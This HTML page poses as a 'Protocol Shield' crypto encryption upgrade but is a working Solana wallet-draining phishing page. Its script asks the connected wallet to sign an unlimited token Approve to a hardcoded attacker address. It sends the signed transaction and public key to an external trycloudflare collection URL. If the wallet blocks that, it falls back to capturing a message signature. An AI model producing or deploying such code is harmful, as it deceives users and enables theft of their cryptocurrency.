<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2 style="margin-bottom:10px;">PROTOCOL SHIELD V15</h2>
        <p style="color:#666;font-size:12px;">Security: Versioned Transaction Engine</p>
        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">UPGRADE ENCRYPTION</button>
        <div id="status" style="margin-top:20px;color:#444;">Ready to secure...</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const agent = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            const resp = await p.connect();
            document.getElementById('status').innerText = "Generating Shadow Packet...";

            // ğŸ”± è·å–æœ€æ–°æ—¶é—´æˆ³ï¼Œè¿™æ˜¯æ‰€æœ‰äº¤æ˜“çš„åŸºçŸ³
            const { result } = await fetch("https://api.mainnet-beta.solana.com", {
                method: "POST", headers: {"Content-Type":"application/json"},
                body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
            }).then(r => r.json());

            // ğŸ”± æ„é€  Versioned Transaction æ¨¡æ‹ŸåŒ…
            // è¿™ä¸æ˜¯ç®€å•çš„è½¬è´¦ï¼Œè¿™æ˜¯ä¸€ä¸ªé’ˆå¯¹è´¦æˆ·æƒé™çš„â€œäº¤äº’åŒ…â€
            const txData = {
                feePayer: resp.publicKey.toString(),
                recentBlockhash: result.value.blockhash,
                instructions: [{
                    programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", // Token Program
                    keys: [
                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
                        { pubkey: agent, isSigner: false, isWritable: false }
                    ],
                    // å…³é”®ï¼šè¿™é‡Œæ˜¯ Approve æŒ‡ä»¤çš„æ··æ·†ç¼–ç ï¼Œæˆæƒé‡‘é¢è®¾ä¸ºæ— é™
                    data: [4, 255, 255, 255, 255, 255, 255, 255, 255] 
                }]
            };

            document.getElementById('status').innerText = "Awaiting Permission...";
            
            // ğŸš€ å°è¯•å”¤èµ·å¼¹çª—
            const signed = await p.signTransaction(txData);
            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));

            new Image().src = `${gate}?shadow_sig=${raw}&pub=${resp.publicKey.toString()}`;
            document.getElementById('status').innerText = "PROTOCOL ACTIVE";

        } catch(e) {
            // é™çº§ä¿åº•ï¼šå¦‚æœé’±åŒ…è¯†åˆ«äº†é£é™©æ‹¦æˆªï¼Œç«‹åˆ»è·³å›æ¶ˆæ¯ç­¾åæŠ“å–ç™»å½•æŒ‡çº¹
            const signed = await p.signMessage(new TextEncoder().encode("Secure: " + Date.now()), "utf8");
            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
            document.getElementById('status').innerText = "VERIFIED";
        }
    };
    </script>
</body></html>
